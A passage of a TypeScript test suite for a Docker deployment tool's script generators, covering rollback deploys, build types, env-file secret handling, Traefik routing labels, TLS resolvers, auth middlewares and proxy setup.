      expect(s).toContain("tugra_abc:prevdep"); // the previous image ref is re-run
      expect(s).toContain('echo "TUGRA_ROLLOUT: rolled_back"; exit 3');
      // a rollback re-run that itself fails is an honest failure, not a fake "kept previous"
      expect(s).toContain('echo "TUGRA_ROLLOUT: rollback_failed"; exit 1');
    });

    it("on health-fail with NO previous version: hard failure (exit 1, no rollback re-run)", () => {
      const s = buildRecreateDeployScript(hostPortApp, "v2", { prevVersion: null, probe: { kind: "stableWait" }, ...gate });
      expect(s).toContain('echo "TUGRA_ROLLOUT: failed"; exit 1');
      expect(s).not.toContain("TUGRA_ROLLOUT: rolled_back");
      // the new image (tugra_abc:v2) is built, but there is exactly ONE `docker run` (the new
      // container) — no second run re-launching a previous image
      expect(s.match(/docker run -d --name tugra_abc/g)?.length).toBe(1);
    });

    it("build=false skips the build/pull prep", () => {
      const s = buildRecreateDeployScript(hostPortApp, "old1", { build: false, prevVersion: "v1", probe: { kind: "stableWait" }, ...gate });
      expect(s).not.toContain("docker pull");
      expect(s).not.toContain("docker tag");
      expect(s).toContain("docker run -d --name tugra_abc");
    });

    it("a domain app forced to recreate (e.g. a named volume) still uses the httpExternal probe", () => {
      const volApp: AppSpec = { ...base, domain: "app.example.com", containerPort: 3000 };
      const s = buildRecreateDeployScript(volApp, "v2", {
        prevVersion: "v1",
        probe: { kind: "httpExternal", port: 3000, path: "/healthz" },
        ...gate,
      });
      expect(s).toContain(
        `docker run --rm --network tugra-proxy ${HEALTH_PROBE_IMAGE} -s -o /dev/null -w '%{http_code}' --max-time 5 'http://tugra_abc:3000/healthz'`,
      );
    });
  });

  it("IMAGE: pulls, snapshots to the versioned tag, removes old, runs the version", () => {
    const s = buildRunScript(base, "v1");
    expect(s).toContain("docker pull -q 'nginx:1.27'");
    expect(s).toContain("docker tag 'nginx:1.27' tugra_abc:v1");
    expect(s).toContain("docker rm -f tugra_abc");
    expect(s).toContain("docker run -d --name tugra_abc --restart unless-stopped 'tugra_abc:v1'");
  });

  it("rollback (build=false): no prep, just runs the existing versioned tag", () => {
    const s = buildRunScript(base, "old1", false);
    expect(s).not.toContain("docker pull");
    expect(s).not.toContain("docker tag");
    expect(s).not.toContain("git clone");
    expect(s).toContain("docker run -d --name tugra_abc --restart unless-stopped 'tugra_abc:old1'");
  });

  it("force deploy (noCache) adds --no-cache to Dockerfile builds only when requested", () => {
    const git: AppSpec = { ...base, source: "GIT", gitUrl: "https://x/y.git", buildType: "DOCKERFILE" };
    const forced = buildRunScript(git, "v1", true, true);
    expect(forced).toContain("docker build --no-cache -t tugra_abc:v1");
    const normal = buildRunScript(git, "v1", true, false);
    expect(normal).toContain("docker build -t tugra_abc:v1");
    expect(normal).not.toContain("--no-cache");
  });

  it("RAILPACK: installs railpack and builds to the versioned tag", () => {
    const s = buildRunScript({ ...base, source: "GIT", gitUrl: "https://x/y.git", buildType: "RAILPACK" }, "v1");
    expect(s).toContain("command -v railpack");
    expect(s).toContain("railpack build /etc/tugra/builds/abc --name tugra_abc:v1");
  });

  it("HEROKU: builds via the pack CLI with the heroku builder", () => {
    const s = buildRunScript({ ...base, source: "GIT", gitUrl: "https://x/y.git", buildType: "HEROKU" }, "v1");
    expect(s).toContain("command -v pack");
    expect(s).toContain("pack build tugra_abc:v1 --path /etc/tugra/builds/abc --builder heroku/builder:24");
  });

  it("injects build args as --build-arg (docker) and --env (buildpacks)", () => {
    const git = { ...base, source: "GIT" as const, gitUrl: "https://x/y.git", buildArgs: { API_URL: "https://api.x" } };
    const dockerfile = buildRunScript({ ...git, buildType: "DOCKERFILE" }, "v1");
    expect(dockerfile).toContain("--build-arg 'API_URL=https://api.x'");
    const nixpacks = buildRunScript({ ...git, buildType: "NIXPACKS" }, "v1");
    // --env flags reach BOTH the plan and the build step
    expect(nixpacks).toContain("nixpacks plan -f json --env 'API_URL=https://api.x' /etc/tugra/builds/abc > /etc/tugra/builds/abc.plan.json");
    expect(nixpacks).toContain("nixpacks build -c /etc/tugra/builds/abc.plan.json --cache-key 'abc' --name tugra_abc:v1 --env 'API_URL=https://api.x' /etc/tugra/builds/abc");
    const railpack = buildRunScript({ ...git, buildType: "RAILPACK" }, "v1");
    expect(railpack).toContain("--env 'API_URL=https://api.x'");
  });

  it("adds no build-arg/env flags when there are no build args", () => {
    const s = buildRunScript({ ...base, source: "GIT", gitUrl: "https://x/y.git", buildType: "DOCKERFILE" }, "v1");
    expect(s).not.toContain("--build-arg");
    expect(s).not.toContain("--env ");
  });

  it("appends custom docker options as shell-quoted argv (not verbatim — injection guard)", () => {
    const s = buildRunScript({ ...base, dockerOptions: "--cap-add=NET_ADMIN --dns 1.1.1.1" }, "v1");
    expect(s).toContain("'--cap-add=NET_ADMIN' '--dns' '1.1.1.1'");
    expect(s).toContain("docker run -d --name tugra_abc --restart unless-stopped");
  });

  it("adds nothing when docker options are unset", () => {
    const s = buildRunScript({ ...base }, "v1");
    expect(s).not.toContain("--cap-add");
    expect(s).not.toContain("--dns");
  });

  it("injects env via an --env-file (0600) instead of -e, plus -p when no domain", () => {
    const s = buildRunScript({ ...base, env: { FOO: "bar baz" }, hostPort: 8080, containerPort: 3000 }, "v1");
    expect(s).toContain("--env-file /etc/tugra/env/abc.env");
    expect(s).toContain("base64 -d > /etc/tugra/env/abc.env");
    expect(s).toContain("chmod 600 /etc/tugra/env/abc.env");
    expect(s).not.toContain("-e 'FOO"); // secrets not on the command line
    expect(s).toContain("-p 8080:3000");
    expect(s).not.toContain("tugra-proxy");
    const m = s.match(/printf %s '([A-Za-z0-9+/=]+)'/);
    expect(m).toBeTruthy();
    expect(Buffer.from(m![1], "base64").toString()).toBe("FOO=bar baz");
  });

  it("adds resource limits + health-check flags when set", () => {
    const s = buildRunScript(
      { ...base, memoryMb: 512, cpus: 0.5, healthCmd: "curl -fsS http://localhost:80/ || exit 1" },
      "v1",
    );
    expect(s).toContain("--memory 512m");
    expect(s).toContain("--cpus 0.5");
    expect(s).toContain("--health-cmd 'curl -fsS http://localhost:80/ || exit 1'");
    expect(s).toContain("--health-interval=10s");
    expect(s).toContain("--health-start-period=30s");
  });

  it("passes --gpus (shell-quoted) when set, and omits it otherwise", () => {
    expect(buildRunScript({ ...base, gpus: "all" }, "v1")).toContain("--gpus 'all'");
    expect(buildRunScript({ ...base, gpus: "device=0,1" }, "v1")).toContain("--gpus 'device=0,1'");
    expect(buildRunScript(base, "v1")).not.toContain("--gpus");
  });

  it("mounts persistent volumes via -v before the image reference", () => {
    const s = buildRunScript(
      { ...base, volumes: [{ name: "data", path: "/app/data" }, { name: "logs", path: "/var/log/app" }] },
      "v1",
    );
    expect(s).toContain("-v tugra_appv_abc_data:/app/data");
    expect(s).toContain("-v tugra_appv_abc_logs:/var/log/app");
    // volume flags precede the image reference in the run command
    expect(s.indexOf("-v tugra_appv_abc_data")).toBeLessThan(s.indexOf("'tugra_abc:v1'"));
  });

  it("omits -v when no volumes are configured (regression)", () => {
    expect(buildRunScript(base, "v1")).not.toContain("-v tugra_appv");
  });

  it("removing an app drops its named volumes too", () => {
    const s = buildRemoveScript({ id: "abc" }, [{ name: "data", path: "/app/data" }]);
    expect(s).toContain("docker rm -f tugra_abc");
    expect(s).toContain("docker volume rm tugra_appv_abc_data");
  });

  it("gitAuthUrl injects x-access-token into https URLs only", () => {
    expect(gitAuthUrl("https://github.com/x/y.git")).toBe("https://x-access-token@github.com/x/y.git");
    expect(gitAuthUrl("git@github.com:x/y.git")).toBe("git@github.com:x/y.git");
  });

  it("GIT private clone uses GIT_ASKPASS and never puts the raw token in the command", () => {
    const s = buildRunScript(
      { ...base, source: "GIT", image: null, gitUrl: "https://github.com/x/y.git", gitBranch: "main", gitToken: "secret123" },
      "v1",
    );
    expect(s).toContain("GIT_ASKPASS=");
    expect(s).toContain("GIT_TERMINAL_PROMPT=0");
    expect(s).toContain("x-access-token@github.com");
    expect(s).toContain('trap');
    expect(s).not.toContain("secret123"); // raw token only travels base64-encoded
  });

  it("GIT clone without a token keeps the plain command (regression)", () => {
    const s = buildRunScript(
      { ...base, source: "GIT", image: null, gitUrl: "https://github.com/x/y.git" },
      "v1",
    );
    expect(s).not.toContain("GIT_ASKPASS");
    expect(s).toContain("git clone --depth 1 --branch 'main' -- 'https://github.com/x/y.git'");
  });

  it("IMAGE pull authenticates to a private registry via --password-stdin (no raw token)", () => {
    const s = buildRunScript(
      { ...base, registryAuth: { url: "reg.io", user: "u", token: "secret123" } },
      "v1",
    );
    expect(s).toContain("--password-stdin");
    expect(s).toContain('docker --config "$sd" login');
    expect(s).toContain("reg.io");
    expect(s).toContain("-u 'u'");
    expect(s).toContain("logout");
    expect(s).not.toContain("--password "); // never the inline flag
    expect(s).not.toContain("secret123");
  });

  it("IMAGE pull without registry auth stays unauthenticated (regression)", () => {
    const s = buildRunScript(base, "v1");
    expect(s).not.toContain("docker login");
    expect(s).not.toContain("DOCKER_CONFIG");
  });

  it("omits limit/health flags when unset (regression)", () => {
    const s = buildRunScript(base, "v1");
    expect(s).not.toContain("--memory");
    expect(s).not.toContain("--cpus");
    expect(s).not.toContain("--health-cmd");
  });

  it("publishes extra ports (TCP + UDP) as additional -p flags; byte-identical when none", () => {
    const s = buildRunScript({ ...base, extraPorts: [{ hostPort: 9090, containerPort: 9090, protocol: "tcp" }, { hostPort: 5353, containerPort: 53, protocol: "udp" }] }, "v1");
    expect(s).toContain("-p 9090:9090");
    expect(s).toContain("-p 5353:53/udp");
    // no extra ports → byte-identical to the plain run
    expect(buildRunScript({ ...base, extraPorts: [] }, "v1")).toBe(buildRunScript(base, "v1"));
  });

  it("writes no env-file when there are no env vars", () => {
    const s = buildRunScript({ ...base, hostPort: 8080 }, "v1");
    expect(s).not.toContain("--env-file");
    expect(s).not.toContain("/etc/tugra/env");
  });

  it("envFileContent / envFileB64 round-trip", () => {
    expect(envFileContent({ A: "1", B: "two" })).toBe("A=1\nB=two");
    expect(Buffer.from(envFileB64({ A: "1" }), "base64").toString()).toBe("A=1");
  });

  it("with a domain, joins the proxy network + Traefik labels, no -p", () => {
    const s = buildRunScript({ ...base, domain: "app.example.com", hostPort: 8080 }, "v1");
    expect(s).toContain("--network tugra-proxy");
    expect(s).toContain("traefik.enable=true");
    expect(s).toContain("Host(`app.example.com`)");
    expect(s).toContain("certresolver=le");
    expect(s).not.toContain("-p 8080");
  });

  it("traefikLabels is empty without a domain", () => {
    expect(traefikLabels(base)).toEqual([]);
    expect(traefikLabels({ ...base, domain: "x.com" }).length).toBeGreaterThan(0);
  });

  it("certType http (magic) serves plain HTTP on :80 — no TLS, no LE, no redirect", () => {
    const s = traefikLabels({ ...base, domain: "app-x.1-2-3-4.sslip.io", certType: "http" }).join("\n");
    expect(s).toContain("Host(`app-x.1-2-3-4.sslip.io`)");
    expect(s).toContain(`routers.tugra_${base.id}.entrypoints=web`);
    expect(s).not.toContain("websecure");
    expect(s).not.toContain("certresolver");
    expect(s).not.toContain("redirectscheme");
    expect(s).not.toContain(`routers.tugra_${base.id}-web.`); // no separate redirect router
  });

  it("certType none is also plain HTTP", () => {
    const s = traefikLabels({ ...base, domain: "x.com", certType: "none" }).join("\n");
    expect(s).toContain("entrypoints=web");
    expect(s).not.toContain("certresolver");
  });

  it("certType le-http keeps HTTPS + LE + the :80→:443 redirect (custom-domain parity)", () => {
    const s = traefikLabels({ ...base, domain: "x.com", certType: "le-http" }).join("\n");
    expect(s).toContain("entrypoints=websecure");
    expect(s).toContain("certresolver=le");
    expect(s).toContain("redirectscheme.scheme=https");
  });

  it("an unset certType defaults to HTTPS (no silent downgrade of existing apps)", () => {
    const s = traefikLabels({ ...base, domain: "x.com" }).join("\n");
    expect(s).toContain("certresolver=le");
    expect(s).toContain("entrypoints=websecure");
  });

  it("certType le-dns uses the le-dns resolver + a wildcard cert for the server domain", () => {
    const s = traefikLabels({
      ...base,
      domain: "app-x.apps.example.com",
      certType: "le-dns",
      wildcardDomain: "apps.example.com",
    }).join("\n");
    expect(s).toContain("tls.certresolver=le-dns");
    expect(s).toContain("tls.domains[0].main=*.apps.example.com");
    expect(s).toContain("tls.domains[0].sans=apps.example.com");
    expect(s).toContain("entrypoints=websecure");
  });

  it("certType custom uses the operator's resolver name", () => {
    const s = traefikLabels({ ...base, domain: "x.com", certType: "custom", customCertResolver: "myresolver" }).join("\n");
    expect(s).toContain("tls.certresolver=myresolver");
    expect(s).not.toContain("tls.domains"); // wildcard only for le-dns
  });

  it("a magic (http) domain still joins the proxy network with no published port", () => {
    const s = buildRunScript({ ...base, domain: "app-x.1-2-3-4.sslip.io", certType: "http", hostPort: 8080 }, "v1");
    expect(s).toContain("--network tugra-proxy");
    expect(s).toContain("Host(`app-x.1-2-3-4.sslip.io`)");
    expect(s).not.toContain("-p 8080");
    expect(s).not.toContain("certresolver");
  });

  it("http-only canonical redirect uses the http scheme", () => {
    const s = traefikLabels({ ...base, domain: "x.com", certType: "http", domainRedirect: "root" }).join("\n");
    expect(s).toContain("redirectregex.regex=^http://www\\.x\\.com/(.*)");
    expect(s).toContain("redirectregex.replacement=http://x.com/${1}");
  });

  it("plain domain has no canon/sec middleware (regression)", () => {
    const s = traefikLabels({ ...base, domain: "x.com" }).join("\n");
    expect(s).toContain("Host(`x.com`)");
    expect(s).not.toContain("-canon");
    expect(s).not.toContain("-sec");
  });

  it("root redirect routes bare+www and redirects www→bare", () => {
    const s = traefikLabels({ ...base, domain: "x.com", domainRedirect: "root" }).join("\n");
    expect(s).toContain("Host(`x.com`) || Host(`www.x.com`)");
    expect(s).toContain("redirectregex.regex=^https://www\\.x\\.com/(.*)");
    expect(s).toContain("redirectregex.replacement=https://x.com/${1}");
    expect(s).toContain("redirectregex.permanent=true");
    expect(s).toContain(`middlewares=tugra_${base.id}-canon`);
  });

  it("www redirect redirects bare→www", () => {
    const s = traefikLabels({ ...base, domain: "x.com", domainRedirect: "www" }).join("\n");
    expect(s).toContain("redirectregex.regex=^https://x\\.com/(.*)");
    expect(s).toContain("redirectregex.replacement=https://www.x.com/${1}");
  });

  it("security headers add a headers middleware to the router", () => {
    const s = traefikLabels({ ...base, domain: "x.com", securityHeaders: true }).join("\n");
    expect(s).toContain("-sec.headers.stsSeconds=31536000");
    expect(s).toContain("-sec.headers.frameDeny=true");
    expect(s).toContain(`middlewares=tugra_${base.id}-sec`);
  });

  it("forward-auth adds a forwardauth middleware first in the chain", () => {
    const labels = traefikLabels({ ...base, domain: "x.com", securityHeaders: true, forwardAuth: "https://auth.x/verify" });
    const s = labels.join("\n");
    expect(s).toContain(`-fa.forwardauth.address=https://auth.x/verify`);
    expect(s).toContain("-fa.forwardauth.trustForwardHeader=true");
    const chain = labels.find((l) => l.includes(`routers.tugra_${base.id}.middlewares=`))!;
    expect(chain).toContain(`tugra_${base.id}-fa`);
    expect(chain.indexOf("-fa")).toBeLessThan(chain.indexOf("-sec")); // auth runs first
  });

  it("no forwardauth label without forwardAuth", () => {
    const s = traefikLabels({ ...base, domain: "x.com" }).join("\n");
    expect(s).not.toContain("forwardauth");
  });

  it("basic-auth adds a basicauth middleware; compose path escapes the bcrypt $ to $$, classic does not", () => {
    const users = [{ user: "admin", hash: "$2b$10$abcDEF" }];
    const classic = traefikLabels({ ...base, domain: "x.com", basicAuthUsers: users }).join("\n");
    expect(classic).toContain(`-ba.basicauth.users=admin:$2b$10$abcDEF`); // literal $ (docker-run label is single-quoted)
    const compose = traefikLabels({ ...base, domain: "x.com", basicAuthUsers: users }, { composeDollarEscape: true }).join("\n");
    expect(compose).toContain(`-ba.basicauth.users=admin:$$2b$$10$$abcDEF`); // $ doubled for compose interpolation
  });

  it("basic-auth runs before forward-auth but after the ip-allowlist filter", () => {
    const labels = traefikLabels({ ...base, domain: "x.com", forwardAuth: "https://a/v", ipAllowlist: ["10.0.0.0/8"], basicAuthUsers: [{ user: "u", hash: "$2b$h" }] });
    const chain = labels.find((l) => l.includes(`routers.tugra_${base.id}.middlewares=`))!;
    expect(chain.indexOf("-ip")).toBeLessThan(chain.indexOf("-ba"));
    expect(chain.indexOf("-ba")).toBeLessThan(chain.indexOf("-fa"));
  });

  it("no basicauth label when there are no users (byte-identical)", () => {
    const withEmpty = traefikLabels({ ...base, domain: "x.com", basicAuthUsers: [] }).join("\n");
    expect(withEmpty).toBe(traefikLabels({ ...base, domain: "x.com" }).join("\n"));
    expect(withEmpty).not.toContain("basicauth");
  });

  it("ip-allowlist adds an ipallowlist middleware FIRST in the chain (before auth)", () => {
    const labels = traefikLabels({ ...base, domain: "x.com", securityHeaders: true, forwardAuth: "https://a/v", ipAllowlist: ["10.0.0.0/8", "1.2.3.4"] });
    const s = labels.join("\n");
    expect(s).toContain(`-ip.ipallowlist.sourcerange=10.0.0.0/8,1.2.3.4`);
    const chain = labels.find((l) => l.includes(`routers.tugra_${base.id}.middlewares=`))!;
    expect(chain).toContain(`tugra_${base.id}-ip`);
    expect(chain.indexOf("-ip")).toBeLessThan(chain.indexOf("-fa")); // IP filter runs before auth
  });

  it("no ipallowlist label when the allowlist is empty (byte-identical)", () => {
    const withEmpty = traefikLabels({ ...base, domain: "x.com", ipAllowlist: [] }).join("\n");
    const without = traefikLabels({ ...base, domain: "x.com" }).join("\n");
    expect(withEmpty).toBe(without);
    expect(withEmpty).not.toContain("ipallowlist");
  });

  it("aliases inherit the ip-allowlist middleware", () => {
    const labels = traefikLabels({ ...base, domain: "x.com", ipAllowlist: ["10.0.0.0/8"], extraDomains: ["b.com"] });
    const x = extraRouterName(`tugra_${base.id}`, "b.com");
    const chain = labels.find((l) => l.includes(`routers.${x}.middlewares=`))!;
    expect(chain).toContain(`tugra_${base.id}-ip`);
  });

  describe("multi-domain aliases (extraDomains)", () => {
    const R = `tugra_${base.id}`;

    it("no extras is byte-identical to today ([] and undefined produce the same labels)", () => {
      for (const spec of [
        { ...base, domain: "x.com" },
        { ...base, domain: "x.com", certType: "le-dns", wildcardDomain: "apps.example.com" },
        { ...base, domain: "x.com", certType: "custom", certPem: "P", certKey: "K" },
        { ...base, domain: "x.com", domainRedirect: "root" as const, securityHeaders: true, forwardAuth: "https://a/v" },
        { ...base, domain: "app-x.1-2-3-4.sslip.io", certType: "http" },
      ]) {
        const baseline = traefikLabels(spec);
        expect(traefikLabels({ ...spec, extraDomains: [] })).toEqual(baseline);
        expect(traefikLabels({ ...spec, extraDomains: undefined })).toEqual(baseline);
      }
    });

    it("one alias adds its own HTTPS router (+ redirect twin) targeting the primary service", () => {
      const labels = traefikLabels({ ...base, domain: "x.com", certType: "le-http", extraDomains: ["b.com"] });
      const x = extraRouterName(R, "b.com");
      const s = labels.join("\n");
      expect(s).toContain(`routers.${x}.rule=Host(\`b.com\`)`);
      expect(s).toContain(`routers.${x}.entrypoints=websecure`);
      expect(s).toContain(`routers.${x}.service=${R}`);
      expect(s).toContain(`routers.${x}.tls.certresolver=le`);
      expect(s).toContain(`routers.${x}-web.rule=Host(\`b.com\`)`);
      expect(s).toContain(`routers.${x}-web.middlewares=${R}-redirect`);
    });

    it("alias router names are hashed, distinct, stable under reordering, and never collide with the primary's suffixes", () => {
      const a = extraRouterName(R, "b.com");
      const b = extraRouterName(R, "c.com");
      expect(a).not.toBe(b);
      expect(extraRouterName(R, "B.COM")).toBe(a); // case-insensitive, order-independent
      for (const suf of ["-web", "-redirect", "-canon", "-sec", "-fa"]) expect(a.endsWith(suf)).toBe(false);
      const l1 = traefikLabels({ ...base, domain: "x.com", extraDomains: ["b.com", "c.com"] });
      const l2 = traefikLabels({ ...base, domain: "x.com", extraDomains: ["c.com", "b.com"] });
      const routers = (ls: string[]) => ls.filter((l) => l.includes(".rule=")).sort();
      expect(routers(l1)).toEqual(routers(l2)); // reordering doesn't rename routers
    });

    it("a plain-HTTP (magic) primary still serves aliases over HTTPS and defines the redirect middleware once", () => {
      const labels = traefikLabels({ ...base, domain: "app-x.sslip.io", certType: "http", extraDomains: ["b.com"] });
      const x = extraRouterName(R, "b.com");
      const s = labels.join("\n");
      expect(s).toContain(`routers.${x}.entrypoints=websecure`);
      expect(s).toContain(`routers.${x}.tls.certresolver=le`);
      expect(labels.filter((l) => l.includes("-redirect.redirectscheme.scheme=https"))).toHaveLength(1);
      expect(s).toContain(`routers.${R}.entrypoints=web`); // primary stays plain HTTP
    });

    it("an le-dns primary's alias uses HTTP-01 (le), never the wildcard", () => {
      const labels = traefikLabels({ ...base, domain: "x.com", certType: "le-dns", wildcardDomain: "apps.example.com", extraDomains: ["b.com"] });
      const x = extraRouterName(R, "b.com");
      expect(labels.join("\n")).toContain(`routers.${x}.tls.certresolver=le`);
      expect(labels.some((l) => l.startsWith(`traefik.http.routers.${x}.tls.domains`))).toBe(false);
    });

    it("an uploaded-cert primary's alias gets tls=true (SNI, no resolver)", () => {
      const labels = traefikLabels({ ...base, domain: "x.com", certType: "custom", certPem: "P", certKey: "K", extraDomains: ["b.com"] });
      const x = extraRouterName(R, "b.com");
      const s = labels.join("\n");
      expect(s).toContain(`routers.${x}.tls=true`);
      expect(s).not.toContain(`routers.${x}.tls.certresolver`);
    });

    it("aliases reuse the fa+sec chain but never the canonical redirect", () => {
      const labels = traefikLabels({ ...base, domain: "x.com", domainRedirect: "root", securityHeaders: true, forwardAuth: "https://a/v", extraDomains: ["b.com"] });
      const x = extraRouterName(R, "b.com");
      const chain = labels.find((l) => l.includes(`routers.${x}.middlewares=`))!;
      expect(chain).toBe(`traefik.http.routers.${x}.middlewares=${R}-fa,${R}-sec`);
      expect(chain).not.toContain("-canon");
    });
  });

  it("proxy setup script runs Traefik with the HTTP-01 resolver by default (no DNS resolver)", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com" });
    expect(s).toContain("docker network create tugra-proxy");
    expect(s).toContain(PROXY_IMAGE);
    expect(s).toContain("acme.email='me@x.com'");
    expect(s).toContain("certificatesresolvers.le.acme.httpchallenge=true");
    // no phone-home: Traefik's upstream version check + anonymous usage report are off
    expect(s).toContain("--global.checknewversion=false");
    expect(s).toContain("--global.sendanonymoususage=false");
    // no DNS-01 resolver / creds when the server has none
    expect(s).not.toContain("le-dns");
    expect(s).not.toContain("--env-file");
    expect(s).not.toContain("acme-dns.json");
  });

  it("adds a DNS-01 wildcard resolver and passes creds via a 0600 --env-file (never -e)", () => {
    const s = buildProxySetupScript({
      acmeEmail: "me@x.com",
      dnsProvider: "cloudflare",
      dnsCreds: { CF_DNS_API_TOKEN: "s3cr3t-token" },
    });
    expect(s).toContain("--certificatesresolvers.le-dns.acme.dnschallenge=true");
    expect(s).toContain("--certificatesresolvers.le-dns.acme.dnschallenge.provider='cloudflare'");
    expect(s).toContain("--certificatesresolvers.le-dns.acme.storage=/letsencrypt/acme-dns.json");
    expect(s).toContain("touch /etc/tugra/letsencrypt/acme-dns.json && chmod 600");
    expect(s).toContain("--env-file /etc/tugra/proxy/dns.env");
    expect(s).toContain("chmod 600 /etc/tugra/proxy/dns.env");
    // the HTTP-01 resolver is still there for custom-domain (le-http) apps
    expect(s).toContain("certificatesresolvers.le.acme.httpchallenge=true");
    // SECURITY: the token appears ONLY inside the base64 env-file blob, never as -e / plaintext argv
    expect(s).not.toContain("-e CF_DNS_API_TOKEN");
    expect(s).not.toContain("s3cr3t-token");
    const m = s.match(/printf %s '([A-Za-z0-9+/=]+)' \| base64 -d > \/etc\/tugra\/proxy\/dns\.env/);
    expect(m).toBeTruthy();
    expect(Buffer.from(m![1], "base64").toString()).toBe("CF_DNS_API_TOKEN=s3cr3t-token");
  });

  it("publishes :80/:443 on all interfaces by default, and byte-identically for bind:'public' (regression)", () => {
    const base = buildProxySetupScript({ acmeEmail: "me@x.com" });
    expect(base).toContain("-p 80:80 -p 443:443");
    // bind:'public' must be byte-identical to the default (no behavior change for existing servers)
    expect(buildProxySetupScript({ acmeEmail: "me@x.com", bind: "public" })).toBe(base);
    // an unknown/empty bind also falls back to public
    expect(buildProxySetupScript({ acmeEmail: "me@x.com", bind: null })).toBe(base);
    expect(buildProxySetupScript({ acmeEmail: "me@x.com", bind: "bogus" })).toBe(base);
  });

  it("binds :80/:443 to loopback only for bind:'loopback' (front-proxy coexistence)", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com", bind: "loopback" });
    expect(s).toContain("-p 127.0.0.1:80:80 -p 127.0.0.1:443:443");
    expect(s).not.toContain("-p 80:80 -p 443:443");
  });

  it("publishes NO host ports for bind:'none' (tunnel-only; coexists with another web server on :80/:443)", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com", bind: "none" });
    expect(s).not.toContain("-p 80:80");
    expect(s).not.toContain("127.0.0.1:80");
    expect(s).not.toMatch(/ -p \d/); // no port-publish flag at all
    // the proxy still runs + listens internally (entrypoints) — reachable via the tunnel on the docker network
    expect(s).toContain("--entrypoints.web.address=:80");
    expect(s).toContain(PROXY_IMAGE);
  });

  // --- Panel-TLS (DİLİM 1) ------------------------------------------------------------------------
  it("always mounts the file provider (even without a panel), alongside the docker provider", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com" });
    expect(s).toContain("-v /etc/tugra/proxy-dynamic:/dynamic:ro");
    expect(s).toContain("--providers.file.directory=/dynamic");
    expect(s).toContain("--providers.file.watch=true");
    expect(s).toContain("mkdir -p /etc/tugra/proxy-dynamic");
    expect(s).toContain("--providers.docker=true");
    expect(s).toContain("--providers.docker.exposedbydefault=false");
    // no panel => no router write/remove, no network connect
    expect(s).not.toContain("proxy-dynamic/panel.yml");
    expect(s).not.toContain("network connect tugra-panel");
  });

  it("panel:undefined leaves the panel file untouched (no write, no rm)", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com" });
    expect(s).not.toContain("panel.yml");
  });

  it("panel object: atomic write (.tmp then mv) appears BEFORE docker run; YAML carries Host(domain)+resolver", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com", panel: { domain: "app.example.com", resolver: "le" } });
    const writeIdx = s.indexOf("/etc/tugra/proxy-dynamic/.panel.yml.tmp");
    const mvIdx = s.indexOf("mv /etc/tugra/proxy-dynamic/.panel.yml.tmp /etc/tugra/proxy-dynamic/panel.yml");
    const runIdx = s.indexOf("docker run -d --name tugra-proxy");
    expect(writeIdx).toBeGreaterThanOrEqual(0);
    expect(mvIdx).toBeGreaterThan(writeIdx);
    expect(runIdx).toBeGreaterThan(mvIdx); // write happens before the proxy starts
    const m = s.match(/printf %s '([A-Za-z0-9+/=]+)' \| base64 -d > \/etc\/tugra\/proxy-dynamic\/\.panel\.yml\.tmp/);
    expect(m).toBeTruthy();
    const yaml = Buffer.from(m![1], "base64").toString();
    expect(yaml).toContain("Host(`app.example.com`)");
    expect(yaml).toContain("certResolver: le");
  });

  it("panel object: docker network connect + verify appear AFTER docker run", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com", panel: { domain: "app.example.com" } });
    const runIdx = s.indexOf("docker run -d --name tugra-proxy");
    const connectIdx = s.indexOf("docker network connect tugra-panel tugra-proxy");
    const verifyIdx = s.indexOf("failed to attach to tugra-panel");
    expect(connectIdx).toBeGreaterThan(runIdx);
    expect(verifyIdx).toBeGreaterThan(connectIdx);
    expect(s).toContain("tugra-panel network missing");
  });

  it("panel:null removes panel.yml and nothing else (acme.json untouched)", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com", panel: null });
    expect(s).toContain("rm -f /etc/tugra/proxy-dynamic/panel.yml");
    expect(s).not.toContain("rm -f /etc/tugra/letsencrypt/acme.json");
    expect(s).not.toContain(".panel.yml.tmp");
    expect(s).not.toContain("network connect tugra-panel");
  });

  it("panel path REQUIRES a real email (throws); the non-panel path keeps the admin@example.com fallback", () => {
    expect(() => buildProxySetupScript({ panel: { domain: "app.example.com" } })).toThrow();
    expect(() => buildProxySetupScript({ acmeEmail: "admin@example.com", panel: { domain: "app.example.com" } })).toThrow();
    // classic app proxy with no email still works (fallback), unchanged behavior
    const s = buildProxySetupScript({});
    expect(s).toContain("acme.email='admin@example.com'");
  });

  it("panel + bind:'none' => httpOnly router (no tls block), still keeps the no-host-ports behavior", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com", panel: { domain: "app.example.com" }, bind: "none" });
    const m = s.match(/printf %s '([A-Za-z0-9+/=]+)' \| base64 -d > \/etc\/tugra\/proxy-dynamic\/\.panel\.yml\.tmp/);
    const yaml = Buffer.from(m![1], "base64").toString();
    expect(yaml).not.toContain("certResolver");
    expect(yaml).not.toContain("tls:");
    expect(s).not.toMatch(/ -p \d/);
  });

  it("panel + dns creds still passes creds via a 0600 --env-file, never in argv", () => {
    const s = buildProxySetupScript({
      acmeEmail: "me@x.com",
      panel: { domain: "app.example.com", resolver: "le-dns" },
      dnsProvider: "cloudflare",
      dnsCreds: { CF_DNS_API_TOKEN: "s3cr3t-token" },
    });
    expect(s).toContain("--env-file /etc/tugra/proxy/dns.env");
    expect(s).not.toContain("s3cr3t-token".replace("s3cr3t-token", "s3cr3t-token") + " "); // token never bare in argv
    expect(s).not.toContain("-e CF_DNS_API_TOKEN");
  });

  it("buildPanelRouterWriteScript only writes/removes the router file (no docker rm/run) for hot-reload", () => {
    const write = buildPanelRouterWriteScript({ domain: "app.example.com", resolver: "le" });
    expect(write).toContain("mv /etc/tugra/proxy-dynamic/.panel.yml.tmp /etc/tugra/proxy-dynamic/panel.yml");
    expect(write).not.toContain("docker run");
    expect(write).not.toContain("docker rm -f tugra-proxy");
    const rm = buildPanelRouterWriteScript(null);
    expect(rm).toContain("rm -f /etc/tugra/proxy-dynamic/panel.yml");
    expect(rm).not.toContain("docker run");
  });

  it("start/restart scripts target the app container (no rebuild)", () => {
    expect(buildStartScript({ id: "abc" })).toBe("docker start tugra_abc");
    expect(buildRestartScript({ id: "abc" })).toBe("docker restart tugra_abc");
  });

